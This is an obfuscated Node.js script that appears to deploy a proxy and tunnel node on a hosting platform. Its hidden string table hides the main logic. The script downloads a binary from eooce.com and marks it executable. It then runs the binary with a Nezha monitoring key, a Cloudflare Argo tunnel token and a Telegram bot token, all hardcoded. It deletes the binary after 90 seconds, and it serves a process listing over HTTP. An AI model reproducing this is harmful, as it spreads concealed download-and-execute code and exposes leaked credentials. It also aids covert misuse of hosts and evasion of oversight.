#!/usr/bin/env node

const _0x573a34 = _0x4bb0
;(function (_0x55b54f, _0x2a60af) {
  const _0x4a938a = { _0x40c1fc: 0xb6, _0x9e27c5: 0x88, _0x2dfd90: 0xe0, _0x48bed3: 0x90, _0x61d538: 0xa1 },
    _0x5217a8 = _0x4bb0,
    _0x5cd556 = _0x55b54f()
  while (!![]) {
    try {
      const _0x45715e =
        (parseInt(_0x5217a8(0x8f)) / 0x1) * (-parseInt(_0x5217a8(_0x4a938a._0x40c1fc)) / 0x2) +
        (parseInt(_0x5217a8(0xaa)) / 0x3) * (parseInt(_0x5217a8(0xbc)) / 0x4) +
        -parseInt(_0x5217a8(_0x4a938a._0x9e27c5)) / 0x5 +
        parseInt(_0x5217a8(0x96)) / 0x6 +
        parseInt(_0x5217a8(_0x4a938a._0x2dfd90)) / 0x7 +
        (-parseInt(_0x5217a8(_0x4a938a._0x48bed3)) / 0x8) * (-parseInt(_0x5217a8(0x89)) / 0x9) +
        (-parseInt(_0x5217a8(_0x4a938a._0x61d538)) / 0xa) * (parseInt(_0x5217a8(0xcd)) / 0xb)
      if (_0x45715e === _0x2a60af) break
      else _0x5cd556['push'](_0x5cd556['shift']())
    } catch (_0x1ef24e) {
      _0x5cd556['push'](_0x5cd556['shift']())
    }
  }
})(_0x432a, 0x41320)
const fs = require('fs'),
  os = require('os'),
  path = require(_0x573a34(0x86)),
  https = require(_0x573a34(0x8d)),
  http = require(_0x573a34(0xa4))
process['noDeprecation'] = !![]
const { spawn, execSync } = require('child_process'),
  PORT = process['env']['PORT'] || 0xbb8,
  SUB_PATH = process['env'][_0x573a34(0xa7)] || _0x573a34(0x99),
  config = {
    NAME: process['env'][_0x573a34(0xc0)] || _0x573a34(0xc8),
    CFIP: process['env']['CFIP'] || _0x573a34(0xd8),
    CFPORT: process[_0x573a34(0xc1)]['CFPORT'] || 0x1bb,
    UPLOAD_URL: process[_0x573a34(0xc1)][_0x573a34(0xb1)] || '',
    FILE_PATH: process[_0x573a34(0xc1)][_0x573a34(0xa0)] || _0x573a34(0xd9),
    NEZHA_SERVER: process[_0x573a34(0xc1)][_0x573a34(0xbe)] || _0x573a34(0x87),
    NEZHA_PORT: process[_0x573a34(0xc1)][_0x573a34(0xad)] || '',
    NEZHA_KEY: process[_0x573a34(0xc1)][_0x573a34(0xb8)] || _0x573a34(0xa2),
    DISABLE_ARGO: process[_0x573a34(0xc1)]['DISABLE_ARGO'] || _0x573a34(0xb0),
    UUID: process[_0x573a34(0xc1)][_0x573a34(0xd7)] || _0x573a34(0xd2),
    ARGO_AUTH: process[_0x573a34(0xc1)]['ARGO_AUTH'] || _0x573a34(0xcf),
    ARGO_DOMAIN: process[_0x573a34(0xc1)][_0x573a34(0x97)] || _0x573a34(0xbf),
    ARGO_PORT: process[_0x573a34(0xc1)]['ARGO_PORT'] || _0x573a34(0x8a),
    S5_PORT: process['env'][_0x573a34(0x94)] || '',
    HY2_PORT: process[_0x573a34(0xc1)][_0x573a34(0xcc)] || '',
    TUIC_PORT: process['env'][_0x573a34(0xa5)] || '',
    ANYTLS_PORT: process[_0x573a34(0xc1)][_0x573a34(0xce)] || '',
    REALITY_PORT: process[_0x573a34(0xc1)][_0x573a34(0xd5)] || '',
    ANYREALITY_PORT: process[_0x573a34(0xc1)][_0x573a34(0x81)] || '',
    CHAT_ID: process[_0x573a34(0xc1)]['CHAT_ID'] || _0x573a34(0xb5),
    BOT_TOKEN: process[_0x573a34(0xc1)][_0x573a34(0xc4)] || _0x573a34(0xc9),
    SHOW_LOG: process[_0x573a34(0xc1)]['SHOW_LOG'] || _0x573a34(0xb0)
  }
function _0x4bb0(_0x56e9ff, _0x222b03) {
  const _0x432a94 = _0x432a()
  return (
    (_0x4bb0 = function (_0x4bb0d7, _0x3c63b7) {
      _0x4bb0d7 = _0x4bb0d7 - 0x7e
      let _0x3cd858 = _0x432a94[_0x4bb0d7]
      return _0x3cd858
    }),
    _0x4bb0(_0x56e9ff, _0x222b03)
  )
}
function log(_0x18790b, _0x25a12a = _0x573a34(0xc7)) {
  const _0x2f8bb2 = { _0x349bd0: 0x80, _0x288943: 0x9a },
    _0xb566fa = _0x573a34,
    _0x5966c7 = new Date()['toLocaleTimeString']()
  console[_0xb566fa(_0x2f8bb2._0x349bd0)]('[' + _0x5966c7 + _0xb566fa(_0x2f8bb2._0x288943) + _0x25a12a + ']\x20' + _0x18790b)
}
function _0x432a() {
  const _0x489dc6 = [
    'kill',
    'S5_PORT',
    'finish',
    '2452608dJEWCX',
    'ARGO_DOMAIN',
    'linux',
    '800',
    ']\x20[',
    'ARGO_AUTH',
    'unlinkSync',
    'arch',
    'sub.txt',
    'get',
    'FILE_PATH',
    '10SYZbPy',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'ERROR',
    'http',
    'TUIC_PORT',
    'Starting\x20application...',
    'SUB_PATH',
    'url',
    'WARN',
    '3GlACPs',
    'Logs\x20will\x20be\x20cleared\x20in\x2090\x20seconds,you\x20can\x20copy\x20the\x20above\x20nodes',
    'utf8',
    'NEZHA_PORT',
    'join',
    'Error:\x20',
    'false',
    'UPLOAD_URL',
    'cwd',
    'text/html',
    'clear',
    '7575949494',
    '19094deWREg',
    'ARGO_PORT',
    'NEZHA_KEY',
    'platform',
    'amd64',
    'createWriteStream',
    '1511404wdTjCJ',
    'statusCode',
    'NEZHA_SERVER',
    'dcdeploy.933993.xyz',
    'NAME',
    'env',
    'message',
    'Download\x20failed,\x20status:\x20',
    'BOT_TOKEN',
    'Unknown\x20architecture,\x20defaulting\x20to\x20amd64',
    'text/plain',
    'INFO',
    'js-node',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    'pipe',
    '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Server\x20is\x20Running</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
    'HY2_PORT',
    '7322678FSUgCB',
    'ANYTLS_PORT',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiNGE3M2UxYTctNTQyOC00MTBjLWE3ZDctZWQ3YzU3ZWJjZDQ1IiwicyI6Ik1qYzVaV05sWmpndFpURTRZaTAwTXpJMExXSTNNVEl0WkRjMFptUTFOV00xTUdaaSJ9',
    'exit',
    'readFileSync',
    '18df3378-491f-4083-8f06-13a8b40e39f5',
    'chmodSync',
    'listen',
    'REALITY_PORT',
    'unlink',
    'UUID',
    'mfa.gov.ua',
    '.npm',
    '✅\x20App\x20is\x20running',
    'disbot',
    ',\x20Arch:\x20',
    '0.0.0.0',
    'inherit',
    'writeHead',
    '2223445oyNgkH',
    'CFPORT',
    'error',
    'aarch64',
    '/ps',
    'log',
    'ANYREALITY_PORT',
    'Process\x20error:\x20',
    'arm64',
    'createServer',
    'index.html',
    'path',
    'nezha.933993.xyz:443',
    '1332935CFnpyw',
    '36iZbdMQ',
    '58081',
    'DISABLE_ARGO',
    'end',
    'https',
    'mkdirSync',
    '43pOipcv',
    '1011184IUtYkP',
    'CFIP',
    'existsSync'
  ]
  _0x432a = function () {
    return _0x489dc6
  }
  return _0x432a()
}
function getArchitecture() {
  const _0x1d58ca = { _0x4b9d6f: 0xb9, _0xbc963: 0x83, _0x34ce75: 0x7e, _0x25f49c: 0xc5, _0x320134: 0xa9 },
    _0x5b419a = _0x573a34,
    _0x3ed894 = os[_0x5b419a(0x9d)](),
    _0x343102 = os[_0x5b419a(_0x1d58ca._0x4b9d6f)]()
  log('Platform:\x20' + _0x343102 + _0x5b419a(0xdc) + _0x3ed894)
  if (_0x343102 === _0x5b419a(0x98) || _0x343102 === 'darwin') {
    if (_0x3ed894 === 'x64' || _0x3ed894 === 'amd64') return _0x5b419a(0xba)
    else {
      if (_0x3ed894 === _0x5b419a(_0x1d58ca._0xbc963) || _0x3ed894 === _0x5b419a(_0x1d58ca._0x34ce75)) return 'arm64'
    }
  }
  return (log(_0x5b419a(_0x1d58ca._0x25f49c), _0x5b419a(_0x1d58ca._0x320134)), _0x5b419a(0xba))
}
function downloadFile(_0x15d7a, _0x2708ee) {
  const _0x341258 = { _0x537dbb: 0xbb, _0x4e9abe: 0x9f, _0x519f0: 0xe2 }
  return new Promise((_0xda1b31, _0x279658) => {
    const _0x6b34ea = { _0x35fefd: 0xca, _0x343b4c: 0x95 },
      _0x10a0c4 = _0x4bb0,
      _0x2b3389 = fs[_0x10a0c4(_0x341258._0x537dbb)](_0x2708ee)
    https[_0x10a0c4(_0x341258._0x4e9abe)](_0x15d7a, (_0x32d8f2) => {
      const _0x2476b5 = _0x10a0c4
      if (_0x32d8f2[_0x2476b5(0xbd)] !== 0xc8) {
        _0x279658(new Error(_0x2476b5(0xc3) + _0x32d8f2['statusCode']))
        return
      }
      ;(_0x32d8f2[_0x2476b5(_0x6b34ea._0x35fefd)](_0x2b3389),
        _0x2b3389['on'](_0x2476b5(_0x6b34ea._0x343b4c), () => {
          ;(_0x2b3389['close'](), _0xda1b31())
        }))
    })['on'](_0x10a0c4(_0x341258._0x519f0), (_0x2ac09a) => {
      const _0x3c86cc = _0x10a0c4
      ;(fs[_0x3c86cc(0xd6)](_0x2708ee, () => {}), _0x279658(_0x2ac09a))
    })
  })
}
const server = http[_0x573a34(0x84)](async (_0x1340dc, _0x106d04) => {
  const _0x1edd8a = {
      _0x1fcee4: 0x92,
      _0x355732: 0xdf,
      _0x516dd2: 0x9e,
      _0x5c94ef: 0x92,
      _0x19ac4f: 0xd1,
      _0x58919e: 0xdf,
      _0x4d4946: 0xc6,
      _0x441830: 0x7f,
      _0x4cb71e: 0xdf,
      _0x483540: 0xc6,
      _0x49efac: 0xdf,
      _0x1940ea: 0x8c,
      _0x10cf33: 0xdf
    },
    _0x176561 = _0x573a34
  try {
    if (_0x1340dc['url'] === '/') {
      const _0x1a668f = path[_0x176561(0xae)](__dirname, _0x176561(0x85))
      if (fs[_0x176561(_0x1edd8a._0x1fcee4)](_0x1a668f)) {
        const _0x4f6639 = fs[_0x176561(0xd1)](_0x1a668f, _0x176561(0xac))
        ;(_0x106d04[_0x176561(0xdf)](0xc8, { 'Content-Type': _0x176561(0xb3) }), _0x106d04['end'](_0x4f6639))
      } else (_0x106d04[_0x176561(_0x1edd8a._0x355732)](0xc8, { 'Content-Type': _0x176561(0xb3) }), _0x106d04[_0x176561(0x8c)](_0x176561(0xcb)))
    } else {
      if (_0x1340dc[_0x176561(0xa8)] === '/' + SUB_PATH) {
        const _0x52e3cd = path['join'](config[_0x176561(0xa0)], _0x176561(_0x1edd8a._0x516dd2))
        if (fs[_0x176561(_0x1edd8a._0x5c94ef)](_0x52e3cd)) {
          const _0x1f89cc = fs[_0x176561(_0x1edd8a._0x19ac4f)](_0x52e3cd, _0x176561(0xac))
          ;(_0x106d04[_0x176561(_0x1edd8a._0x58919e)](0xc8, { 'Content-Type': _0x176561(_0x1edd8a._0x4d4946) }),
            _0x106d04[_0x176561(0x8c)](_0x1f89cc))
        } else (_0x106d04[_0x176561(0xdf)](0x194), _0x106d04[_0x176561(0x8c)]('sub.txt\x20not\x20found\x20yet.'))
      } else {
        if (_0x1340dc[_0x176561(0xa8)] === _0x176561(_0x1edd8a._0x441830))
          try {
            const _0xfea898 = execSync('ps\x20aux', { encoding: _0x176561(0xac), maxBuffer: 0x400 * 0x400 })
            ;(_0x106d04[_0x176561(_0x1edd8a._0x4cb71e)](0xc8, { 'Content-Type': _0x176561(_0x1edd8a._0x483540) }),
              _0x106d04[_0x176561(0x8c)](_0xfea898))
          } catch (_0x4f4ade) {
            ;(_0x106d04[_0x176561(_0x1edd8a._0x4cb71e)](0x1f4), _0x106d04[_0x176561(0x8c)](_0x176561(0xaf) + _0x4f4ade['message']))
          }
        else (_0x106d04[_0x176561(_0x1edd8a._0x49efac)](0x194), _0x106d04[_0x176561(_0x1edd8a._0x1940ea)]('404\x20Not\x20Found'))
      }
    }
  } catch (_0x5d7943) {
    ;(_0x106d04[_0x176561(_0x1edd8a._0x10cf33)](0x1f4), _0x106d04['end']('Internal\x20Server\x20Error'))
  }
})
async function main() {
  const _0x1aca5e = {
      _0x5738ae: 0xba,
      _0x4a051d: 0xb2,
      _0x2b36ad: 0xdb,
      _0x46d50d: 0xd3,
      _0x16fd23: 0xc1,
      _0xdce6d6: 0xbe,
      _0x50dee3: 0xb8,
      _0x51ce97: 0x9b,
      _0x42641a: 0xe1,
      _0x2567e1: 0xa0,
      _0x1a0935: 0xb7,
      _0x5b3f1e: 0xd5,
      _0x30fb30: 0xc4,
      _0x35d36d: 0x8b,
      _0x38cc78: 0xde,
      _0x2cc17a: 0xc2,
      _0x404c4d: 0xa3,
      _0x426d8c: 0x9c,
      _0x1ad1d8: 0xd0
    },
    _0x179e95 = { _0x8bc2d7: 0xab },
    _0xa872bd = { _0x225083: 0x9c, _0xc8ed11: 0xb4, _0x7085c1: 0xda },
    _0x2cee68 = _0x573a34
  log(_0x2cee68(0xa6))
  let _0x4f6bb4 = '',
    _0x476cb4 = null
  try {
    fs[_0x2cee68(0x8e)](config[_0x2cee68(0xa0)], { recursive: !![] })
    const _0x220e0b = getArchitecture(),
      _0x14a02f = _0x220e0b === _0x2cee68(_0x1aca5e._0x5738ae) ? 'https://amd64.eooce.com/sbsh' : 'https://arm64.eooce.com/sbsh'
    ;((_0x4f6bb4 = path[_0x2cee68(0xae)](process[_0x2cee68(_0x1aca5e._0x4a051d)](), _0x2cee68(_0x1aca5e._0x2b36ad))),
      await downloadFile(_0x14a02f, _0x4f6bb4),
      fs[_0x2cee68(_0x1aca5e._0x46d50d)](_0x4f6bb4, 0x1ed))
    const _0x15b187 = {
      ...process[_0x2cee68(_0x1aca5e._0x16fd23)],
      UUID: config['UUID'],
      NEZHA_SERVER: config[_0x2cee68(_0x1aca5e._0xdce6d6)],
      NEZHA_PORT: config['NEZHA_PORT'],
      NEZHA_KEY: config[_0x2cee68(_0x1aca5e._0x50dee3)],
      ARGO_DOMAIN: config[_0x2cee68(0x97)],
      ARGO_AUTH: config[_0x2cee68(_0x1aca5e._0x51ce97)],
      CFIP: config[_0x2cee68(0x91)],
      CFPORT: config[_0x2cee68(_0x1aca5e._0x42641a)],
      NAME: config[_0x2cee68(0xc0)],
      FILE_PATH: config[_0x2cee68(_0x1aca5e._0x2567e1)],
      ARGO_PORT: config[_0x2cee68(_0x1aca5e._0x1a0935)],
      S5_PORT: config[_0x2cee68(0x94)],
      HY2_PORT: config[_0x2cee68(0xcc)],
      TUIC_PORT: config['TUIC_PORT'],
      ANYTLS_PORT: config[_0x2cee68(0xce)],
      REALITY_PORT: config[_0x2cee68(_0x1aca5e._0x5b3f1e)],
      ANYREALITY_PORT: config[_0x2cee68(0x81)],
      CHAT_ID: config['CHAT_ID'],
      BOT_TOKEN: config[_0x2cee68(_0x1aca5e._0x30fb30)],
      UPLOAD_URL: config['UPLOAD_URL'],
      DISABLE_ARGO: config[_0x2cee68(_0x1aca5e._0x35d36d)]
    }
    ;((_0x476cb4 = spawn(_0x4f6bb4, [], { env: _0x15b187, stdio: _0x2cee68(_0x1aca5e._0x38cc78) })),
      _0x476cb4['on']('error', (_0x1a141f) => {
        const _0x188a57 = _0x2cee68
        log(_0x188a57(0x82) + _0x1a141f['message'], 'ERROR')
      }),
      _0x476cb4['on'](_0x2cee68(0xd0), (_0x6a6a64) => {
        const _0x55ade5 = _0x2cee68
        ;(log(_0x55ade5(_0x179e95._0x8bc2d7)),
          setTimeout(() => {
            const _0x2a3f02 = _0x55ade5
            fs['existsSync'](_0x4f6bb4) &&
              (fs[_0x2a3f02(_0xa872bd._0x225083)](_0x4f6bb4), console[_0x2a3f02(_0xa872bd._0xc8ed11)](), log(_0x2a3f02(_0xa872bd._0x7085c1)))
          }, 0x15f90))
      }),
      log('🌐\x20HTTP:\x20http://localhost:' + PORT),
      process['on']('SIGINT', () => {
        const _0x198d4f = _0x2cee68
        log('Shutting\x20down...')
        if (_0x476cb4) _0x476cb4[_0x198d4f(0x93)]()
        if (fs['existsSync'](_0x4f6bb4)) fs['unlinkSync'](_0x4f6bb4)
        process['exit'](0x0)
      }))
  } catch (_0x4e978b) {
    ;(log(_0x2cee68(0xaf) + _0x4e978b[_0x2cee68(_0x1aca5e._0x2cc17a)], _0x2cee68(_0x1aca5e._0x404c4d)),
      fs['existsSync'](_0x4f6bb4) && fs[_0x2cee68(_0x1aca5e._0x426d8c)](_0x4f6bb4),
      process[_0x2cee68(_0x1aca5e._0x1ad1d8)](0x1))
  }
}
;(server[_0x573a34(0xd4)](PORT, _0x573a34(0xdd), () => {}), main())
